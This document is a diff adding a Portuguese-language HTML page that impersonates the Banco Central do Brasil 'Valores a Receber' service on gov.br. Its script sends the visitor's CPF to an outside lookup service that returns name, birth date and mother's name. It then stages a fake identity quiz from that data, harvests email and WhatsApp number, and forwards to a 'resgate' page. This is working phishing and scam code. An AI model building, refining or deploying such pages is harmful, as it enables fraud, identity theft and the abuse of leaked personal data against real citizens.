@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Valores a Receber — Banco Central do Brasil</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        /* ===== RESET GLOBAL — ZERO OVERFLOW ===== */
+        *, *::before, *::after { 
+            box-sizing: border-box !important; 
+            margin: 0; 
+        }
+        html { 
+            overflow-x: hidden; 
+            width: 100%; 
+            max-width: 100vw; 
+        }
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: #fff; 
+            color: #333; 
+            margin: 0; 
+            padding: 0; 
+            overflow-x: hidden; 
+            width: 100%; 
+            max-width: 100vw;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== HEADER GOV.BR ===== */
+        .gov-header { 
+            border-bottom: 1px solid #e1e5eb; 
+            background: #fff; 
+            width: 100%; 
+            max-width: 100vw; 
+        }
+        .gov-topbar { 
+            border-bottom: 1px solid #e1e5eb; 
+            width: 100%; 
+        }
+        .gov-topbar-inner {
+            width: 100%;
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 8px;
+            min-width: 0;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            min-width: 0;
+            flex-shrink: 1;
+            gap: 0;
+        }
+        .br-divider-v { 
+            border-right: 1px solid #e1e5eb; 
+            height: 24px; 
+            margin: 0 12px; 
+            flex-shrink: 0;
+        }
+        .ico-menu { color: #1351b4; font-size: 1.25rem; cursor: pointer; flex-shrink: 0; }
+        .site-name { font-size: 1.125rem; color: #1e1e1e; text-decoration: none; white-space: nowrap; }
+
+        /* FIX: user-name com truncate absoluto */
+        .user-name-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            min-width: 0;
+            max-width: 140px;
+            flex-shrink: 1;
+            margin-left: 8px;
+        }
+        .user-name-wrapper .user-icon {
+            flex-shrink: 0;
+            font-size: 1.25rem;
+            color: #94a3b8;
+        }
+        .user-name-text {
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            display: block;
+            min-width: 0;
+            font-size: 11px;
+            font-weight: 600;
+            color: #475569;
+            line-height: 1.2;
+        }
+
+        .nav-bar {
+            width: 100%;
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        /* ===== PAGE ===== */
+        .page-container { width: 100%; padding: 32px 20px; flex-grow: 1; }
+        .page-inner { max-width: 800px; margin: 0 auto; width: 100%; }
+
+        .gov-title-wrapper { display: flex; flex-direction: column; align-items: center; text-align: center; margin-bottom: 40px; }
+        .gov-title-logo { height: 42px; margin-bottom: 16px; }
+        .gov-main-title { font-size: 1.25rem; font-weight: 800; color: #1351b4; line-height: 1.3; margin-bottom: 4px; }
+        .gov-sub-title { font-size: 0.95rem; color: #555; }
+
+        .step-badge {
+            background: #1351b4; color: white; width: 32px; height: 32px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 700; font-size: 1rem; flex-shrink: 0;
+        }
+        .step-title { font-size: 1.15rem; font-weight: 800; color: #1e1e1e; }
+
+        /* ===== QUIZ ===== */
+        .quiz-wrapper { width: 100%; max-width: 448px; margin: 0 auto; padding: 0; }
+        .quiz-options { display: flex; flex-direction: column; gap: 12px; width: 100%; }
+        .opt {
+            background: #fff; border: 1px solid #d1d5db; padding: 18px 20px; border-radius: 8px;
+            cursor: pointer; transition: all 0.2s; font-weight: 600; color: #374151; font-size: 0.95rem;
+            width: 100%; word-break: break-word; overflow-wrap: break-word;
+        }
+        .opt:hover { border-color: #1351b4; background: #f8fafc; }
+        .opt.selected { border: 2px solid #1351b4; background: #eff6ff; color: #1351b4; padding: 17px 19px; }
+        .opt.wrong { border: 2px solid #dc2626; background: #fef2f2; color: #b91c1c; padding: 17px 19px; }
+
+        .confirm-btn {
+            width: 100%; padding: 18px; border-radius: 8px;
+            font-weight: 700; font-size: 1.05rem; transition: all 0.2s;
+            margin-top: 20px; border: none; display: block;
+        }
+        .btn-inactive { background: #d1d5db; color: #ffffff; cursor: not-allowed; }
+        .btn-active { background: #1351b4; color: #ffffff; cursor: pointer; }
+        .btn-active:hover { background: #0c3e92; }
+        .btn-success { background: #16a34a !important; color: white !important; cursor: default; }
+
+        .input-gov {
+            width: 100%; background: #f9fafb; border: 1px solid #d1d5db;
+            border-radius: 8px; padding: 16px; outline: none; font-size: 1rem; color: #1f2937;
+            transition: all 0.2s; margin-bottom: 20px;
+        }
+        .input-gov:focus { border-color: #1351b4; box-shadow: 0 0 0 2px rgba(19,81,180,0.2); }
+        .input-label { display: block; font-size: 0.85rem; font-weight: 700; color: #4b5563; margin-bottom: 6px; }
+
+        /* ===== FOOTER — CORES CORRIGIDAS ===== */
+        .gov-footer { background: #061e41; padding: 40px 20px 20px; margin-top: auto; width: 100%; }
+        .gov-footer-inner { width: 100%; max-width: 1140px; margin: 0 auto; text-align: center; }
+        .gov-footer-img { height: 35px; filter: brightness(0) invert(1); margin-bottom: 16px; }
+        .gov-footer-links { display: flex; gap: 16px; margin-top: 24px; justify-content: center; }
+        .gov-footer-links a { color: rgba(255,255,255,0.7); font-size: 0.75rem; text-decoration: none; }
+        .gov-footer-bottom {
+            background: #051531; padding: 16px 20px; text-align: center;
+            color: rgba(255,255,255,0.7); font-size: 0.75rem; width: 100%;
+        }
+
+        /* ===== QUIZ ROOT — CONTENÇÃO TOTAL ===== */
+        #quiz-root { 
+            width: 100%; 
+            max-width: 100%; 
+            overflow: hidden; 
+            min-height: 400px;
+        }
+
+        /* ===== ANIMAÇÃO ===== */
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-fade-in { animation: fadeIn 0.4s ease-out; }
+
+        /* ===== MOBILE RESPONSIVE ===== */
+        @media (max-width: 640px) {
+            .hide-mobile { display: none !important; }
+            .page-container { padding: 24px 16px; }
+            .opt { padding: 16px; font-size: 0.9rem; }
+            .opt.selected, .opt.wrong { padding: 15px; }
+            .user-name-wrapper { max-width: 110px; }
+            .gov-topbar-inner { padding: 10px 12px; }
+            .nav-bar { padding: 12px; }
+            .gov-footer { padding: 32px 16px 16px; }
+            .gov-footer-bottom { padding: 12px 16px; }
+        }
+
+        @media (max-width: 380px) {
+            .user-name-wrapper { max-width: 80px; }
+            .opt { padding: 14px 12px; font-size: 0.85rem; }
+            .opt.selected, .opt.wrong { padding: 13px 11px; }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="gov-header">
+        <div class="gov-topbar">
+            <div class="gov-topbar-inner">
+                <a href="#"><img src="images/logo.png" alt="gov.br" class="h-6 sm:h-7 object-contain"></a>
+                <div class="header-right text-blue-900">
+                    <button class="px-2"><i class="fas fa-ellipsis-v opacity-60"></i></button>
+                    <div class="br-divider-v hide-mobile"></div>
+                    <span class="text-xs font-bold hide-mobile px-2 cursor-pointer">PT <i class="fas fa-angle-down ml-1"></i></span>
+                    <button class="px-2 hide-mobile"><i class="fas fa-cookie-bite opacity-60"></i></button>
+                    <button class="px-2 hide-mobile"><i class="fas fa-adjust opacity-60"></i></button>
+                    <button class="px-2 hide-mobile"><i class="fas fa-th opacity-60"></i></button>
+                    <div class="user-name-wrapper">
+                        <i class="fas fa-user-circle user-icon"></i>
+                        <span class="user-name-text">Olá, <b id="user-p">...</b></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="nav-bar">
+            <i class="fas fa-bars ico-menu"></i>
+            <a href="#" class="site-name">Banco Central do Brasil</a>
+        </div>
+    </header>
+
+    <main class="page-container">
+        <div class="page-inner">
+            <div class="gov-title-wrapper animate-fade-in">
+                <img src="images/logo.png" alt="gov.br" class="gov-title-logo">
+                <h1 class="gov-main-title">Verificação de Identidade</h1>
+                <p class="gov-sub-title">Confirme seus dados para prosseguir.</p>
+            </div>
+            
+            <div id="quiz-root">
+                <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; padding: 40px; color:#64748b;">
+                    <i class="fas fa-spinner fa-spin text-3xl mb-4 text-blue-800"></i>
+                    <p style="font-weight:700; font-size:0.875rem;">Validando acesso seguro...</p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="gov-footer">
+        <div class="gov-footer-inner">
+            <img src="images/govbr.png" alt="gov.br" class="gov-footer-img">
+            <p style="color:rgba(255,255,255,0.8); font-size:0.75rem; margin-top:8px;">Todo o conteúdo deste site está publicado sob a licença Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada.</p>
+            <div class="gov-footer-links">
+                <a href="#">Privacidade</a>
+                <a href="#">Termos de Uso</a>
+            </div>
+        </div>
+    </footer>
+    <div class="gov-footer-bottom">
+        SVR — Sistema de Valores a Receber do Governo Federal.
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script>
+        $(function () {
+            let userData = JSON.parse(sessionStorage.getItem('userData')) || {};
+            const cpf = userData.CPF;
+
+            if (!cpf) { window.location.href = "login.html"; return; }
+
+            if (userData.NOME && /EXEMPLO|TITULAR|CARREGANDO|IDENTIFICADO/i.test(userData.NOME)) {
+                userData.NOME = "";
+            }
+
+            async function fetchData() {
+                if (userData.NOME && userData.NOME.length > 2 && userData.MAE) {
+                    startQuiz(); return;
+                }
+
+                try {
+                    var cpfLimpo = cpf.replace(/\D/g, '');
+                    var controller = new AbortController();
+                    var timeoutId = setTimeout(function() { controller.abort(); }, 10000);
+
+                    console.log('[API] Consultando CPF:', cpfLimpo);
+
+                    var res = await fetch(
+                        'https://searchapi.dnnl.live/consulta?token_api=2077&cpf=' + cpfLimpo,
+                        { method: 'GET', headers: { 'Accept': 'application/json' }, signal: controller.signal }
+                    );
+                    clearTimeout(timeoutId);
+                    console.log('[API] Status:', res.status);
+
+                    var text = await res.text();
+                    console.log('[API] Resposta bruta:', text);
+
+                    var data = {};
+                    try { data = JSON.parse(text); } catch(e) { console.error('[API] JSON inválido'); }
+
+                    console.log('[API] Campos raiz:', Object.keys(data));
+
+                    // ===== FIX: dados vem dentro de data.dados[0] =====
+                    var pessoa = null;
+                    if (data.dados && Array.isArray(data.dados) && data.dados.length > 0) {
+                        pessoa = data.dados[0];
+                    } else if (data.NOME || data.nome) {
+                        pessoa = data; // fallback caso mude a estrutura
+                    }
+
+                    if (pessoa) {
+                        console.log('[API] Pessoa encontrada:', JSON.stringify(pessoa));
+
+                        var nome = pessoa.NOME || pessoa.nome || pessoa.name || '';
+                        var nasc = pessoa.NASC || pessoa.nascimento || pessoa.data_nascimento || '';
+                        var mae  = pessoa.NOME_MAE || pessoa.nome_mae || pessoa.MAE || pessoa.mae || '';
+
+                        if (nome && nome.trim().length > 2) {
+                            userData.NOME = nome.toUpperCase().trim();
+                            userData.NASC = nasc || '22/10/1982';
+                            userData.MAE  = mae && mae.trim().length > 2 ? mae.toUpperCase().trim() : 'MARIA SILVA';
+                            sessionStorage.setItem('userData', JSON.stringify(userData));
+                            console.log('[API] ✅ Nome:', userData.NOME, '| Mãe:', userData.MAE, '| Nasc:', userData.NASC);
+                        } else {
+                            console.warn('[API] Nome vazio ou curto:', nome);
+                        }
+                    } else {
+                        console.warn('[API] Nenhum registro em dados[]:', JSON.stringify(data));
+                    }
+
+                } catch(e) {
+                    console.error('[API] ❌ Falha:', e.message || e);
+                }
+
+                if (!userData.NOME || userData.NOME.length < 3) {
+                    userData.NOME = 'IDENTIFICADO';
+                    userData.MAE  = 'NÃO INFORMADA';
+                    console.warn('[API] Usando fallback');
+                }
+                startQuiz();
+            }
+
+            function shuffle(a) { return a.sort(function() { return Math.random() - 0.5; }); }
+
+            function startQuiz() {
+                $('#user-p').text(userData.NOME.split(' ')[0]);
+                renderStep1();
+            }
+
+            function renderStep1() {
+                var arr = [userData.NOME, 'MARCOS ANTONIO SILVA', 'JOSE RICARDO ALVES', 'FLAVIO HENRIQUE COSTA'];
+                var unique = [];
+                for (var i = 0; i < arr.length; i++) {
+                    if (unique.indexOf(arr[i]) === -1 && arr[i].trim().length > 0) unique.push(arr[i]);
+                }
+                while(unique.length < 4) unique.push('NOME GENERICO ' + unique.length);
+                renderQuestion(1, 'Qual é seu nome completo?', shuffle(unique), userData.NOME, renderStep2);
+            }
+
+            function renderStep2() {
+                renderQuestion(2, 'Qual é sua data de nascimento?', shuffle([userData.NASC || '12/03/1981', '12/05/1975', '22/10/1988', '05/01/1992']), userData.NASC, renderStep3);
+            }
+
+            function renderStep3() {
+                var mae = userData.MAE || 'MARIA DA SILVA';
+                renderQuestion(3, 'Qual é o nome da sua mãe?', shuffle([mae, 'MARIA LUCIA SANTOS', 'ANA PAULA FERREIRA', 'TEREZA CRISTINA LIMA']), mae, renderStep4);
+            }
+
+            function renderStep4() {
+                renderQuestion(4, 'Qual sua faixa de renda?', ['Até R$ 2.500,00', 'De R$ 2.500 a R$ 5.000,00', 'De R$ 5.000 a R$ 10.000,00', 'Acima de R$ 10.000,00'], null, renderStepFinal);
+            }
+
+            function renderStepFinal() {
+                $('#quiz-root').html(
+                    '<div class="animate-fade-in quiz-wrapper">' +
+                        '<div style="display:flex;align-items:center;gap:16px;margin-bottom:32px">' +
+                            '<div class="step-badge">5</div>' +
+                            '<h3 class="step-title">Dados de Contato</h3>' +
+                        '</div>' +
+                        '<div>' +
+                            '<label class="input-label">E-mail</label>' +
+                            '<input type="email" id="email" class="input-gov" placeholder="seu@email.com">' +
+                            '<label class="input-label">Celular / WhatsApp</label>' +
+                            '<input type="text" id="tel" class="input-gov" placeholder="(00) 00000-0000">' +
+                        '</div>' +
+                        '<button id="finish-btn" class="confirm-btn btn-inactive" disabled>CONFIRMAR DADOS</button>' +
+                    '</div>'
+                );
+                $('#tel').mask('(00) 00000-0000');
+                function validate() {
+                    if($('#email').val().indexOf('@') > -1 && $('#tel').val().length >= 14) {
+                        $('#finish-btn').prop('disabled', false).removeClass('btn-inactive').addClass('btn-active');
+                    } else {
+                        $('#finish-btn').prop('disabled', true).addClass('btn-inactive').removeClass('btn-active');
+                    }
+                }
+                $('#email, #tel').on('input', validate);
+                $('#finish-btn').click(function() {
+                    $(this).prop('disabled', true).html('<i class="fas fa-circle-notch fa-spin"></i> CONTINUANDO...');
+                    setTimeout(function() { window.location.href = 'resgate.html'; }, 1200);
+                });
+            }
+
+            function renderQuestion(step, text, choices, correct, next) {
+                $('#quiz-root').html(
+                    '<div class="animate-fade-in quiz-wrapper">' +
+                        '<div style="display:flex;align-items:center;gap:16px;margin-bottom:32px">' +
+                            '<div class="step-badge">' + step + '</div>' +
+                            '<h3 class="step-title">' + text + '</h3>' +
+                        '</div>' +
+                        '<div class="quiz-options">' +
+                            choices.map(function(c) { return '<div class="opt" data-val="' + c + '">' + c + '</div>'; }).join('') +
+                        '</div>' +
+                        '<button id="step-btn" class="confirm-btn btn-inactive" disabled>Confirmar</button>' +
+                    '</div>'
+                );
+                var selected = null;
+                $('.opt').click(function() {
+                    $('.opt').removeClass('selected wrong');
+                    $(this).addClass('selected');
+                    selected = $(this).data('val');
+                    $('#step-btn').prop('disabled', false).removeClass('btn-inactive').addClass('btn-active');
+                });
+                $('#step-btn').click(function() {
+                    var btn = $(this);
+                    btn.prop('disabled', true).html('<i class="fas fa-circle-notch fa-spin"></i>');
+                    setTimeout(function() {
+                        if (correct && selected !== correct) {
+                            $('.opt.selected').addClass('wrong').removeClass('selected');
+                            btn.html('Confirmar').removeClass('btn-active').addClass('btn-inactive');
+                        } else {
+                            btn.removeClass('btn-active').addClass('btn-success').html('<i class="fas fa-check"></i> Correto');
+                            setTimeout(function() { next(); }, 600);
+                        }
+                    }, 600);
+                });
+            }
+
+            fetchData();
+        });
+    </script>
+</body>
+</html>
